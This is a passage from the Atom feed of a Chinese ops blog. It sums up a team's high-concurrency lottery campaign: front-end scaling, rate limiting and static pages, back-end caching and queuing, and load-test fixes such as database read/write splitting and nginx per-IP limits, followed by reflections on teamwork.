&lt;figure class=&quot;highlight lsl&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;、前端三板斧【扩容】【限流】【静态化】&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;、后端两条路【内存】+【排队】&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;测试总结经验&quot;&gt;&lt;a href=&quot;#测试总结经验&quot; class=&quot;headerlink&quot; title=&quot;测试总结经验&quot;&gt;&lt;/a&gt;测试总结经验&lt;/h4&gt;&lt;p&gt;第一次做抽奖活动，测试那边测试出很多问题。 下面是遇到的问题。&lt;/p&gt;
&lt;figure class=&quot;highlight x86asm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;测试第一次: 访问压测出现了访问白屏。定位：代码写的有问题。 tomcat需要做优化。 我们一般用户量粉丝在100W&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;测试第二次： 出现数据库&lt;span class=&quot;meta&quot;&gt;CPU&lt;/span&gt;瓶颈过高。主从同步，然后做了数据库读写分离， redis集群缓存。 最主要是数据库SQL语句做了优化。优化了提升了很大一部分。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;测试第三次：还有出现了&lt;span class=&quot;number&quot;&gt;503&lt;/span&gt;访问受限了。 后面做了nginx代理 防止同一个&lt;span class=&quot;built_in&quot;&gt;IP&lt;/span&gt;同一个时间超过多少次去请求，会被受限。 不过这个做DDOS攻击 有很大一部分影响用户名体验度。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;四、非技术感想&quot;&gt;&lt;a href=&quot;#四、非技术感想&quot; class=&quot;headerlink&quot; title=&quot;四、非技术感想&quot;&gt;&lt;/a&gt;四、非技术感想&lt;/h4&gt;&lt;p&gt;1、团队的力量是无穷的，各种各样的解决方案（先不谈可行性）都是在小伙伴们七嘴八舌中讨论出来的。我们需要让所有人都发出自己的声音，不要着急去否定。&lt;/p&gt;
&lt;p&gt;2、优化需要从整体层面去思考，不要只纠结于自己负责的部分，如果只盯着一个点思考，最后很可能就走进死胡同中了。&lt;/p&gt;
&lt;p&gt;3、有很多东西以为读过了就懂了，其实不然。依然还是需要实践，否则别人的知识永远不可能变成自己的。&lt;/p&gt;
&lt;p&gt;4、多思考为什么，会发生什么，不要想当然。只有这样才能深入进去，而不是留在表面。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近业务试水微信抽奖活动，公司现在打算推广下产品。增加些粉丝量 之前经常看到淘宝的同行们讨论秒杀，讨论电商，这次终于轮到我们自己理论结合实际一次了。&lt;/p&gt;
&lt;p&gt;ps：进入正文前先说一点个人感受，之前看淘宝的ppt感觉都懂了，等到自己出解决方案的时候发现还是有很多想不到的
    
    </summary>
    
      <category term="运维笔记" scheme="http://blog.yangcvo.me/categories/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
